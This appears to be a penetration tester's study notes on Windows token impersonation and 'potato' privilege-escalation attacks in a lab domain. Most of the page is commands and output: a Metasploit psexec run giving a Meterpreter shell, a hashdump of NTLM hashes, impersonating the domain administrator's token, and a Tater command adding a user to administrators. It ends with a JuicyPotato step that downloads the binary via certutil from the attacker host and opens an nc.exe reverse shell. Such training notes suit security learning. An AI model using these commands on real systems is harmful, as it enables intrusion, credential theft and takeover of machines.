# Token Impersonation - Potato attacks

## What is it

- Token are temp keys that give access to a system or network without credentials.

## How to

- Launch Metasploit `msfconsole`
- Choose the exploit: `use exploit/windows/smb/psexec`
- Set: rhosts, smbdomain, smbpass, smbuser, target (we can use `show targets` to have a list), payload
- Launch the attack: `run`
- We get a shell:
  ```
  msf6 exploit(windows/smb/psexec) > run

  [*] Started reverse TCP handler on 10.0.2.8:4444 
  [*] 10.0.2.15:445 - Connecting to the server...
  [*] 10.0.2.15:445 - Authenticating to 10.0.2.15:445|marvel.local as user 'fcastle'...
  [!] 10.0.2.15:445 - peer_native_os is only available with SMB1 (current version: SMB3)
  [*] 10.0.2.15:445 - Uploading payload... oeyrkyrs.exe
  [*] 10.0.2.15:445 - Created \oeyrkyrs.exe...
  [*] Sending stage (200262 bytes) to 10.0.2.15
  [+] 10.0.2.15:445 - Service started successfully...
  [*] 10.0.2.15:445 - Deleting \oeyrkyrs.exe...
  [*] Meterpreter session 1 opened (10.0.2.8:4444 -> 10.0.2.15:61871 ) at 2022-02-11 13:49:12 -0500

  meterpreter > 
  ```
- Getting hashes: `hashdump`
  ```
  meterpreter > hashdump
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  Frank Castle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e6cedee56d27d175f48042b53cb6b242:::
  ```
- Use tools: `load` (double tab to get the list of tools)
- `load incognito`
  ```
  Incognito Commands
  ==================

      Command              Description
      -------              -----------
      add_group_user       Attempt to add a user to a global group with all tokens
      add_localgroup_user  Attempt to add a user to a local group with all tokens
      add_user             Attempt to add a user with all tokens
      impersonate_token    Impersonate specified token
      list_tokens          List tokens available under current user context
      snarf_hashes         Snarf challenge/response hashes for every token
  ```
- list_tokens -u
  ```
  meterpreter > list_tokens -u

  Delegation Tokens Available
  ========================================
  Font Driver Host\UMFD-0
  Font Driver Host\UMFD-1
  Font Driver Host\UMFD-2
  MARVEL\Administrator
  MARVEL\fcastle
  NT AUTHORITY\LOCAL SERVICE
  NT AUTHORITY\NETWORK SERVICE
  NT AUTHORITY\SYSTEM
  Window Manager\DWM-1
  Window Manager\DWM-2

  Impersonation Tokens Available
  ========================================
  No tokens available
  ```
- Impersonate Administrator: 
  ```
  meterpreter > impersonate_token marvel\\administrator
  [+] Delegation token available
  [+] Successfully impersonated user MARVEL\Administrator
  meterpreter > shell
  Process 8576 created.
  Channel 1 created.
  Microsoft Windows [Version 10.0.19044.1288]
  (c) Microsoft Corporation. All rights reserved.
  C:\Windows\system32>whoami
  whoami
  marvel\administrator
  ```
- If we hashdump again it will not work so we can rev2self to get back to the initial user
- Any user that has logged in the target will have a token there until the target reboots

## Potato Attacks

- These attacks requires the `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` to be enabled on the machine.

### Hot potato

- We can use [Tater](https://github.com/Kevin-Robertson/Tater)
- `powershell.exe -nop -ep bypass`
- `Import-Module .\Tater.ps1`
- `Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"`
- Your user should be in the administrators group `net localgroup administrators` to check

- See [here](../writeups/HTB-Jeeves.md) an example of a potato attack

### Juicy potato

#### Enumeration after initial shell with MSSQL

- Say we have a shell on an mssql instance `mssqlclient.py sql_dev@IP-ADD -windows-auth`
- We can enable command shell using `enable_xp_cmdshell`
- And then we will be able to type every command we need this way: `xp_cmdshell whoami /priv`
- For juicy potato we need to check if we have `SeImpersonatePrivilege` enabled  
![image](https://user-images.githubusercontent.com/96747355/163688651-8f07b5f6-4b0d-4ece-bb80-8249770d3b29.png)  
- We do!

#### Exploitation

- Let's get JuicyPotato binary in our attacking machine `wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe`
- Let's serve the file to our target using python http server `python3 -m http.server 80`
- Let's take it in our shell using certutil `xp_cmdshell certutil.exe -urlcache -f http://10.10.14.117/JuicyPotato.exe C:\Tools\JuicyPotato.exe`
- Let's get an admin shell `xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.117 8443 -e cmd.exe" -t *` where -l is the COM server listening port, -p is the program to launch (cmd.exe), -a is the argument passed to cmd.exe, and -t is the createprocess call. We are trying both the CreateProcessWithTokenW and CreateProcessAsUser functions, which need SeImpersonate or SeAssignPrimaryToken privileges respectively.
- And we should have an authority system shell  
![image](https://user-images.githubusercontent.com/96747355/163689119-b9682c58-c8cc-421b-9d62-1e2d7451f525.png)  

## Resources

{% embed url="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/" %} Rotten Potato - Foxglove Security {% endembed %}  
{% embed url="https://github.com/ohpe/juicy-potato" %} Juicy Potato {% endembed %}  
{% embed url="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" %} TCM Security - Windows privilege escalation {% endembed %}  
